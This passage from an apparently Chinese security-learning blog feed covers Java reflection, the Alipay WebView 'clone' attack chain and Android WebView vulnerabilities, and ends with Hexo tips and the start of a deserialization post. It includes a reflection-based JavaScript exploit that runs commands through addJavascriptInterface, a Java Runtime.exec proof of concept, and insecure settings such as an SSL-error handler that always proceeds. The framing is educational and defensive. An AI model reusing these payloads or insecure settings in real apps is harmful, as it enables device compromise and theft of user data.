/*新的要求，加注解,API17以上*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">showToast</span><span class="params">(String toast)</span> </span>&#123;</span><br><span class="line">        Toast.makeText(mContext, toast, Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">WebView webView = (WebView) findViewById(R.id.webview);</span><br><span class="line">webView.addJavascriptInterface(<span class="keyword">new</span> WebAppInterface(<span class="keyword">this</span>), <span class="string">"Android"</span>);</span><br></pre></td></tr></table></figure><ul><li>上面这段Android代码中，把WebAppInterface类映射到了js中的的Android对象上，所以可以在js中调用WebAppInterface类的方法</li></ul><p>对于强迫症患者，一定会疑惑这个“Android”在js中算什么，类？还是实例？，下面一段是Google文档的解释,Webview帮我们初始化好这个js的”Android”对象，可以直接在JavaScript中调用</p><blockquote><p>You can bind this class to the JavaScript that runs in your WebView with addJavascriptInterface() and name the interface Android. For example:<br>This creates an interface called Android for JavaScript running in the WebView. At this point, your web application has access to the WebAppInterface class. For example, here’s some HTML and JavaScript that creates a toast message using the new interface when the user clicks a button:<br>There’s no need to initialize the Android interface from JavaScript. The WebView automatically makes it available to your web page. So, at the click of the button, the showAndroidToast() function uses the Android interface to call the WebAppInterface.showToast() method.</p></blockquote><ul><li>结合前面的Java反射知识，既然暴露了Java对象给JavaScript操作，首先可以通过这个这个对象的“getClass()”方法获得对应类的Class对象，然后调用Class对象的”forname()”方法加载指定的“Runtime”类，这个特殊的“Runtime”类再调用”getmethod()”方法调用类里面的getruntime方法，返回一个Method对象，最后调用”invoke()”方法执行Runtime类的exec()方法。。。这就是整个思路了</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company.test;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WebAppInterface</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">showToast</span><span class="params">(String toast)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"just a test class"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, IllegalAccessException,</span></span><br><span class="line"><span class="function">            InstantiationException, IOException, NoSuchMethodException, InvocationTargetException </span>&#123;</span><br><span class="line">        WebAppInterface Android = <span class="keyword">new</span> WebAppInterface();<span class="comment">/* 模拟一个可以被js调用的实例 */</span></span><br><span class="line">        Method method = Android.getClass().forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>,<span class="keyword">null</span>);</span><br><span class="line">        Runtime run = (Runtime) method.invoke(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">        run.exec(<span class="string">"open /Applications/Calculator.app/"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/RCE.jpg" alt="效果图"></p><h1 id="Bonus"><a href="#Bonus" class="headerlink" title="Bonus"></a>Bonus</h1><p>关于Java泛型的一点讲解：泛型的本质是参数化类型，也就是说所操作的数据类型被指定为一个参数。</p><p><a href="https://www.jianshu.com/p/95f349258afb" target="_blank" rel="noopener">详细的Java 泛型讲解请点击我</a></p><ol><li>不用泛型直接通过反射创建类的实例，需要进行强制类型转换</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Consumer clazz;</span><br><span class="line">clazz = (Consumer) Class.forName(<span class="string">"com.company.hsbc.Consumer"</span>).newInstance();</span><br></pre></td></tr></table></figure><ol><li>用object类型可以解决问题</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object clazz;</span><br><span class="line">clazz = Class.forName(<span class="string">"com.company.hsbc.Consumer"</span>).newInstance();</span><br></pre></td></tr></table></figure><h1 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h1>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1-什么是Java反射和应用场景&quot;&gt;&lt;a href=&quot;#1-什么是Java反射和应用场景&quot; class=&quot;headerlink&quot; title=&quot;1 什么是Java反射和应用场景&quot;&gt;&lt;/a&gt;1 什么是Java反射和应用场景&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;详细的反射教程可
      
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Android支付宝克隆漏洞</title>
    <link href="http://yoursite.com/2018/01/30/Android%E6%94%AF%E4%BB%98%E5%AE%9D%E5%85%8B%E9%9A%86%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/01/30/Android支付宝克隆漏洞/</id>
    <published>2018-01-30T15:54:33.000Z</published>
    <updated>2018-01-30T09:32:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>上一篇文章介绍了Android Webview组件的安全问题，其中一个就是file域访问限制不严格导致数据泄露，前段时间很火的支付宝克隆漏洞也是基于file协议的权限设置不当造成的，参考了很多文章总结一下攻击流程：</p><h1 id="1-克隆漏洞基本原理解释："><a href="#1-克隆漏洞基本原理解释：" class="headerlink" title="1 克隆漏洞基本原理解释："></a>1 克隆漏洞基本原理解释：</h1><ul><li><p>Step 1 ：通过 URL Scheme 的方式唤起打开 App 里暴露出去的(export=true)带 WebView 组件的 Activity , 这里需要得到支付宝的Scheme，然后通过这些Scheme打开Webview</p></li><li><p>Step 2 ：在发送给目标的网页中通过a标签调用支付宝带 WebView 组件的 Activity，从而实现在支付宝中打开Webview</p></li><li><p>Step 3 ：Webview加载攻击者的攻击脚本到本地SD卡的download目录：</p></li><li><p>Step 4 ：再利用file协议加载攻击者存在本地的脚本</p></li><li><p>Step 5 ：由于这个Webview是通过支付宝打开的，再通过file协议读取本地攻击脚本，所以本地攻击脚本实际是支付宝打开的，可以读取支付宝沙盒进程的个人用户数据，并上传回服务器，到此，攻击完成，成功得到用户的支付宝数据</p></li><li><p>Step 6 ：攻击者加载目标用户的支付宝数据，支付宝没有二次验证机器指纹直接默认登录成功，攻击者可以使用用户的支付宝进行支付</p></li></ul><h1 id="2-漏洞利用的关键点："><a href="#2-漏洞利用的关键点：" class="headerlink" title="2 漏洞利用的关键点："></a>2 漏洞利用的关键点：</h1><ol><li>在 Step 1 中：</li></ol><p>这里使用了支付宝定义的URL Scheme，如何得到有效的Scheme，使得可以通过a标签启动支付宝的Webview，这是一个关键点</p><ol><li><p>在 Step 2 中：<br>构造一个网页，网页代码要包含：1.启动支付宝的Webview  2.下载攻击脚本到本地SD卡的download目录 3.利用file协议加载本地攻击脚本</p></li><li><p>在 Step 5 中：<br>下载到本地的攻击脚本再一次利用file协议读取支付宝的个人数据，并上传到攻击者的服务器或者设备中</p></li><li><p>攻击成功的两个关键点：</p></li></ol><ul><li><p>WebView中setAllowFileAccessFromFileURLs 或setAllowUniversalAccessFromFileURLsAPI配置为true；</p></li><li><p>WebView可以直接被外部调用，并能够加载外部可控的HTML文件</p></li></ul><h1 id="3-相关技术介绍："><a href="#3-相关技术介绍：" class="headerlink" title="3 相关技术介绍："></a>3 相关技术介绍：</h1><ul><li>什么是URL Scheme：</li></ul><blockquote><p>android中的scheme是一种页面内跳转协议，是一种非常好的实现机制，通过定义自己的scheme协议，可以非常方便跳转app中的各个页面；通过scheme协议，服务器可以定制化告诉App跳转那个页面，可以通过通知栏消息定制化跳转页面，可以通过H5页面跳转页面等。</p><p>客户端应用可以向操作系统注册一个 URL scheme，该 scheme 用于从浏览器或其他应用中启动本应用。通过指定的 URL 字段，可以让应用在被调起后直接打开某些特定页面，比如商品详情页、活动详情页等等。也可以执行某些指定动作，如完成支付等。也可以在应用内通过 html 页来直接调用显示 app 内的某个页面</p></blockquote><h1 id="4-总结："><a href="#4-总结：" class="headerlink" title="4 总结："></a>4 总结：</h1><p>这次的克隆漏洞利用的都是Android Webview的已知漏洞，但却玩出了新花样，但却引出了一些问题，例如Chrome打开网页自动下载没有一丁点提示，支付宝没有对用户进行二次设备验证等</p><h1 id="5-refer-link："><a href="#5-refer-link：" class="headerlink" title="5 refer link："></a>5 refer link：</h1><p>关于Android平台WebView控件存在跨域访问高危漏洞的安全公告<br><a href="http://www.cnvd.org.cn/webinfo/show/4365?from=timeline&amp;isappinstalled=0" target="_blank" rel="noopener">http://www.cnvd.org.cn/webinfo/show/4365?from=timeline&amp;isappinstalled=0</a></p><p>“应用克隆”攻击模型<br><a href="https://mp.weixin.qq.com/s/pQqOLQS_hWfv8btYpYK1xQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/pQqOLQS_hWfv8btYpYK1xQ</a></p><p>Android安全开发之浅谈网页打开APP<br><a href="https://yq.aliyun.com/articles/57088" target="_blank" rel="noopener">https://yq.aliyun.com/articles/57088</a></p><p>Webview跨源攻击分析<br><a href="http://blogs.360.cn/360mobile/2014/09/22/webview%E8%B7%A8%E6%BA%90%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://blogs.360.cn/360mobile/2014/09/22/webview%E8%B7%A8%E6%BA%90%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/</a></p><p>Attack Your Android Apps By Webview<br><a href="http://blog.knownsec.com/2013/03/attack-your-android-apps-by-webview/" target="_blank" rel="noopener">http://blog.knownsec.com/2013/03/attack-your-android-apps-by-webview/</a></p><p>Andorid Intent 与 Chrome<br><a href="https://developer.chrome.com/multidevice/android/intents?spm=5176.100239.blogcont57088.9.1c29be50KIPvAG" target="_blank" rel="noopener">https://developer.chrome.com/multidevice/android/intents?spm=5176.100239.blogcont57088.9.1c29be50KIPvAG</a></p><p>克隆攻击分析与复现<br><a href="https://xianzhi.aliyun.com/forum/topic/1952" target="_blank" rel="noopener">https://xianzhi.aliyun.com/forum/topic/1952</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;上一篇文章介绍了Android Webview组件的安全问题，其中一个就是file域访问限制不严格导致数据泄露，前段时间很火的支付宝克隆漏洞也是基于file协议的权限设置不当造成的，参考了很多文章总结一下攻击流程：&lt;/p&gt;
&lt;h1 id=&quot;1-克隆漏洞基本原理解释：&quot;&gt;&lt;a
      
    
    </summary>
    
    
      <category term="Android" scheme="http://yoursite.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Android WebView Vulnerabilities</title>
    <link href="http://yoursite.com/2018/01/27/Android-WebView-Vulnerabilities/"/>
    <id>http://yoursite.com/2018/01/27/Android-WebView-Vulnerabilities/</id>
    <published>2018-01-26T17:29:30.000Z</published>
    <updated>2018-01-29T10:27:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>今天专门总结一下Android Webview漏洞，因为这是一个安全大坑，我也被坑了…郁闷，平时复习一下就好了</p><h1 id="1-基本开发知识："><a href="#1-基本开发知识：" class="headerlink" title="1 基本开发知识："></a>1 基本开发知识：</h1><p>If you want to deliver a web application (or just a web page) as a part of a client application, you can do it using WebView。顾名思义就是开发web app之类的，用处很多，不详细讲了，看开发文档写得很清楚</p><ul><li>添加Webview,步骤为写配置文件到layout，建立Webview类，然后取得Internet权限，一目了然</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">写配置文件：</span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span><br><span class="line">&lt;WebView  xmlns:android=<span class="string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="line">    android:id=<span class="string">"@+id/webview"</span></span><br><span class="line">    android:layout_width=<span class="string">"fill_parent"</span></span><br><span class="line">    android:layout_height=<span class="string">"fill_parent"</span></span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">新建类：</span><br><span class="line">WebView myWebView = (WebView) findViewById(R.id.webview);</span><br><span class="line">myWebView.loadUrl(&quot;http://www.example.com&quot;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">申请Internet权限：</span><br><span class="line">&lt;manifest ... &gt;</span><br><span class="line">    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;</span><br><span class="line">    ...</span><br><span class="line">&lt;/manifest&gt;</span><br></pre></td></tr></table></figure><ul><li>使用JavaScript（JavaScript is disabled in a WebView by default）</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">通过Websettings开启JavaScript</span><br><span class="line">WebView myWebView = (WebView) findViewById(R.id.webview);</span><br><span class="line">WebSettings webSettings = myWebView.getSettings();</span><br><span class="line">webSettings.setJavaScriptEnabled(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><ul><li>通过绑定JavaScript和你指定的android代码,让JavaScript可以调用你指定的代码，例如你定义了一个WebAppInterface类</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebAppInterface</span> </span>&#123;</span><br><span class="line">    Context mContext;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Instantiate the interface and set the context */</span></span><br><span class="line">    WebAppInterface(Context c) &#123;</span><br><span class="line">        mContext = c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Show a toast from the web page */</span></span><br><span class="line">    <span class="meta">@JavascriptInterface</span>  <span class="comment">/*新的要求，加注解,API17以上*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">showToast</span><span class="params">(String toast)</span> </span>&#123;</span><br><span class="line">        Toast.makeText(mContext, toast, Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">WebView webView = (WebView) findViewById(R.id.webview);</span><br><span class="line">webView.addJavascriptInterface(<span class="keyword">new</span> WebAppInterface(<span class="keyword">this</span>), <span class="string">"Android"</span>);</span><br></pre></td></tr></table></figure><ul><li>到此，JavaScript就可以调用你定义的函数了</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"Say hello"</span> <span class="attr">onClick</span>=<span class="string">"showAndroidToast('Hello Android!')"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    function showAndroidToast(toast) &#123;</span></span><br><span class="line"><span class="undefined">        Android.showToast(toast); /*There's no need to initialize the Android interface from JavaScript. The WebView automatically makes it available to your web page</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="2-存在的安全问题："><a href="#2-存在的安全问题：" class="headerlink" title="2 存在的安全问题："></a>2 存在的安全问题：</h1><h2 id="1-Webview-任意代码执行漏洞"><a href="#1-Webview-任意代码执行漏洞" class="headerlink" title="1 Webview 任意代码执行漏洞"></a>1 Webview 任意代码执行漏洞</h2><ol><li>问题方法”addJavascriptInterface()”,上文基础部分中提到这个方法让JavaScript调用你定义的JAVA函数</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mWebView.addJavascriptInterface(<span class="keyword">new</span> TestAddJsInterface(), “myjs”);</span><br></pre></td></tr></table></figure><ol><li>在API17之前，上面的“addJavascriptInterface()”方法会导致出现问题，网页中的JS脚本可以利用接口“myjs”调用App中的Java代码，而Java对象继承关系会导致很多Public的函数及getClass函数都可以在JS中被访问，结合Java的反射机制，攻击者还可以获得系统类的函数，进而可以进行任意代码执行</li></ol><p>类似的攻击代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">function <span class="title">execute</span><span class="params">(cmdArgs)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="comment">// 步骤1：遍历 window 对象</span></span><br><span class="line">    <span class="comment">// 目的是为了找到包含 getClass()的对象</span></span><br><span class="line">    <span class="comment">// 因为Android映射的"myjs"对象也在window中，所以肯定会遍历到</span></span><br><span class="line">    <span class="keyword">for</span> (var obj in window) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"getClass"</span> in window[obj]) &#123;  </span><br><span class="line"></span><br><span class="line">      <span class="comment">// 步骤2：利用反射调用forName（）得到Runtime类对象</span></span><br><span class="line">            alert(obj);          </span><br><span class="line">            <span class="keyword">return</span>  window[obj].getClass().forName(<span class="string">"java.lang.Runtime"</span>)  </span><br><span class="line"></span><br><span class="line">      <span class="comment">// 步骤3：以后，就可以调用静态方法来执行一些命令，比如访问文件的命令</span></span><br><span class="line">getMethod(<span class="string">"getRuntime"</span>,<span class="keyword">null</span>).invoke(<span class="keyword">null</span>,<span class="keyword">null</span>).exec(cmdArgs);  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 从执行命令后返回的输入流中得到字符串，有很严重暴露隐私的危险。</span></span><br><span class="line"><span class="comment">// 如执行完访问文件的命令之后，就可以得到文件名的信息了。</span></span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>当一些 APP 通过扫描二维码打开一个外部网页时，攻击者就可以执行这段 js 代码进行漏洞攻击</p></li><li><p>关键的JAVA反射思路如下：</p></li></ol><ul><li>JAVA中的对象有一公共的方法：getClass() ；</li><li>该方法可以获取到当前类的Class对象</li><li>该类有一关键的方法： Class.forName；</li><li>该方法可以加载一个类（可加载 java.lang.Runtime 类）</li><li>而该类是可以执行本地命令的</li></ul><ol><li>解决方案：</li></ol><p>Google在API_17中规定允许被调用的函数必须以@JavascriptInterface进行注解，理论上如果APP依赖的API为17或者以上，就不会受该问题的影响。所以检查API的版本和关键函数的注解可以有效识别漏洞</p><h2 id="2-WebView域控制不严格漏洞"><a href="#2-WebView域控制不严格漏洞" class="headerlink" title="2 WebView域控制不严格漏洞"></a>2 WebView域控制不严格漏洞</h2><p>这个漏洞主要出现在了对file协议的控制不当上，通过4个API来理解WebView中file协议的安全性，下面的代码是新建一个Webview，通过发送Intent调用这个export的activity，把intent中的data作为url传入Webview，这个data是攻击者可控的</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebViewActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> WebView webView;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_webview);</span><br><span class="line">        webView = (WebView) findViewById(R.id.webView1);</span><br><span class="line">        <span class="comment">//webView.getSettings().setAllowFileAccess(false);                    (1)</span></span><br><span class="line">        <span class="comment">//webView.getSettings().setJavaScriptEnabled(true);                   (2)</span></span><br><span class="line">        <span class="comment">//webView.getSettings().setAllowFileAccessFromFileURLs(true);       (3)</span></span><br><span class="line">        <span class="comment">//webView.getSettings().setAllowUniversalAccessFromFileURLs(true); (4)</span></span><br><span class="line">        Intent i = getIntent();</span><br><span class="line">        String url = i.getData().toString();</span><br><span class="line">        webView.loadUrl(url);</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>/<strong>Mainifest.xml</strong>/<br>// 将该 WebViewActivity 在Mainifest.xml设置exported属性<br>// 表示：当前Activity是否可以被另一个Application的组件启动<br>android:exported=”true”</p><ol><li>setAllowFileAccess</li></ol><p>设置是否允许 WebView 使用 File 协议 ,默认设置为true，即允许在 File 域下执行任意 JavaScript 代码 ,使用 file 域加载的 js代码能够使用进行同源策略跨域访问，从而导致隐私信息泄露,如果不允许使用 file 协议，则不会存在上述的威胁；但同时也限制了 WebView 的功能，使其不能加载本地的 html 文件</p><ol><li>setAllowFileAccessFromFileURLs</li></ol><p>设置是否允许通过 file url 加载的 Js代码读取其他的本地文件,当这个方法为true时，攻击者可以读取本地敏感文件<br>在Android 4.1前默认允许<br>在Android 4.1后默认禁止</p><ol><li><p>setAllowUniversalAccessFromFileURLs<br>设置是否允许通过 file url 加载的 Javascript 可以访问其他的源(包括http、https等源)<br>在Android 4.1前默认允许（setAllowFileAccessFromFileURLs（）不起作用）<br>在Android 4.1后默认禁止</p></li><li><p>setJavaScriptEnabled</p></li></ol><p>设置是否允许 WebView 使用 JavaScript（默认是不允许）<br>但很多应用（包括移动浏览器）为了让 WebView 执行 http 协议中的 JavaScript，都会主动设置为true，不区别对待是非常危险的。</p><ol><li><p>符号链接跨源攻击 (不看)</p></li><li><p>最佳设置</p></li></ol><ul><li><p>对于不需要使用 file 协议的应用，禁用 file 协议；</p></li><li><p>对于需要使用 file 协议的应用，禁止 file 协议加载 JavaScript。</p></li></ul><h2 id="明文保存密码"><a href="#明文保存密码" class="headerlink" title="明文保存密码"></a>明文保存密码</h2><ol><li>WebView默认开启密码保存功能 ：</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mWebView.setSavePassword(<span class="keyword">true</span>)</span><br></pre></td></tr></table></figure><p>开启后，在用户输入密码时，会弹出提示框：询问用户是否保存密码；<br>如果选择”是”，密码会被明文保到 /data/data/com.package.name/databases/webview.db 中，这样就有被盗取密码的危险</p><ol><li>关闭密码保存提醒</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">WebSettings.setSavePassword(<span class="keyword">false</span>)</span><br></pre></td></tr></table></figure><h2 id="SSL-Error-Handling"><a href="#SSL-Error-Handling" class="headerlink" title="SSL Error Handling"></a>SSL Error Handling</h2><p>直接忽略了SSL错误的处理方法，让程序继续运行，让程序有机会收到Mitm</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceivedSslError</span><span class="params">(WebView view, SslErrorHandler handler,</span></span></span><br><span class="line"><span class="function"><span class="params">SslError error)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">handler.proceed();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="refer-link"><a href="#refer-link" class="headerlink" title="refer link:"></a>refer link:</h1><p><a href="https://pentestlab.blog/2017/02/12/android-webview-vulnerabilities/" target="_blank" rel="noopener">https://pentestlab.blog/2017/02/12/android-webview-vulnerabilities/</a></p><p><a href="https://developer.android.com/guide/webapps/webview.html" target="_blank" rel="noopener">https://developer.android.com/guide/webapps/webview.html</a></p><p><a href="https://www.jianshu.com/p/3a345d27cd42" target="_blank" rel="noopener">https://www.jianshu.com/p/3a345d27cd42</a></p><p><a href="https://www.jianshu.com/p/5b3acad0f025" target="_blank" rel="noopener">https://www.jianshu.com/p/5b3acad0f025</a></p><p><a href="http://blogs.360.cn/360mobile/2014/09/22/webview%E8%B7%A8%E6%BA%90%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://blogs.360.cn/360mobile/2014/09/22/webview%E8%B7%A8%E6%BA%90%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天专门总结一下Android Webview漏洞，因为这是一个安全大坑，我也被坑了…郁闷，平时复习一下就好了&lt;/p&gt;
&lt;h1 id=&quot;1-基本开发知识：&quot;&gt;&lt;a href=&quot;#1-基本开发知识：&quot; class=&quot;headerlink&quot; title=&quot;1 基本开发知识：&quot;&gt;
      
    
    </summary>
    
    
      <category term="Android" scheme="http://yoursite.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Hexo 奇怪的错误</title>
    <link href="http://yoursite.com/2018/01/27/Hexo-%E5%A5%87%E6%80%AA%E7%9A%84%E9%94%99%E8%AF%AF/"/>
    <id>http://yoursite.com/2018/01/27/Hexo-奇怪的错误/</id>
    <published>2018-01-26T17:26:23.000Z</published>
    <updated>2018-01-26T09:29:09.000Z</updated>
    
    <content type="html"><![CDATA[<ul><li>升级后遇到了一个奇怪的错误,在Hexo目录下“hexo”命令失效了：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo</span><br><span class="line">ERROR Local hexo not found in ~/Hexo</span><br><span class="line">ERROR Try running: &apos;npm install hexo --save&apos;</span><br></pre></td></tr></table></figure><ul><li>解决方法如下：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm -rf node_modules/ &amp;&amp; npm install</span><br></pre></td></tr></table></figure><ul><li>错误原因：</li></ul><p>Unknown</p><ul><li>Refer link:</li></ul><p><a href="https://github.com/hexojs/hexo/issues/2076" target="_blank" rel="noopener">https://github.com/hexojs/hexo/issues/2076</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;升级后遇到了一个奇怪的错误,在Hexo目录下“hexo”命令失效了：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$
      
    
    </summary>
    
    
      <category term="Hexo" scheme="http://yoursite.com/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>Hexo 统计字数的新插件</title>
    <link href="http://yoursite.com/2018/01/25/Hexo-%E7%BB%9F%E8%AE%A1%E5%AD%97%E6%95%B0%E7%9A%84%E6%96%B0%E6%8F%92%E4%BB%B6/"/>
    <id>http://yoursite.com/2018/01/25/Hexo-统计字数的新插件/</id>
    <published>2018-01-25T11:44:50.000Z</published>
    <updated>2018-01-25T06:11:21.000Z</updated>
    
    <content type="html"><![CDATA[<ul><li>最近更新了一下博客的主题版本，发现原来的wordcount插件不行了，查看了一下配置文件，推荐了新插件：”hexo-symbols-count-time”</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Post wordcount display settings</span><br><span class="line"># Dependencies: https://github.com/theme-next/hexo-symbols-count-time</span><br><span class="line">symbols_count_time:</span><br><span class="line">  symbols: true</span><br><span class="line">  time: true</span><br><span class="line">  total_symbols: true</span><br><span class="line">  total_time: true</span><br></pre></td></tr></table></figure><ul><li>马上尝试一下：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-symbols-count-time --save</span><br></pre></td></tr></table></figure><ul><li>具体的配置方法参考：</li></ul><p><a href="https://github.com/theme-next/hexo-symbols-count-time" target="_blank" rel="noopener">https://github.com/theme-next/hexo-symbols-count-time</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;最近更新了一下博客的主题版本，发现原来的wordcount插件不行了，查看了一下配置文件，推荐了新插件：”hexo-symbols-count-time”&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr
      
    
    </summary>
    
    
      <category term="Hexo" scheme="http://yoursite.com/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>Java 反序列化漏洞学习笔记</title>
    <link href="http://yoursite.com/2018/01/24/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2018/01/24/Java-反序列化漏洞学习笔记/</id>
    <published>2018-01-24T15:59:15.000Z</published>
    <updated>2018-02-05T07:35:22.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-什么是Java序列化和反序列化"><a href="#1-什么是Java序列化和反序列化" class="headerlink" title="1 什么是Java序列化和反序列化:"></a>1 什么是Java序列化和反序列化:</h1><ol><li><p>Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream类的 writeObject() 方法可以实现序列化。</p></li><li><p>Java 反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 readObject() 方法用于反序列化。</p></li><li><p>网络上传输和本地硬盘中存储的是字节流，即01010之类的数据，所以序列化在传输和存储中是必要的,问题的根源在于类ObjectInputStream在反序列化时，没有对生成的对象的类型做限制；</p></li><li><p>首先在序列化和反序列化的过程中，每个类都有自己的readObject与writeObject对应，很多类自己重写了自己的readObject与writeObject函数，是否有漏洞要看程序有没有用了一些指定的库</p></li><li><p>基本的序列化和反序列化代码：</p></li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123; </span><br><span class="line">    String obj = <span class="string">"hello world!"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将序列化对象写入文件object.db中</span></span><br><span class="line">    FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"object.db"</span>);</span><br><span class="line">    ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">    